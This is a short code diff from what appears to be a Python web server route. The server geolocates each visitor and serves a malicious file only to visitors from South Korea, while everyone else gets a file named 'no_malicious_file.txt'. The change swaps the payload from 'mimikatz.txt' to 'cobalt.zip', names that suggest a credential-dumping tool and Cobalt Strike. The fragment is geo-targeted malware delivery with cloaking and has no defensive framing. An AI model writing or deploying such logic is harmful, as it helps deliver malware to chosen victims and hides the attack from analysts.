@@ -15,7 +15,7 @@ def home():
     country_code = res.json()["data"].get("country_code", None)
 
     if country_code == "KR":
-        path += "mimikatz.txt"
+        path += "cobalt.zip"
 
     else:
         path += "no_malicious_file.txt"
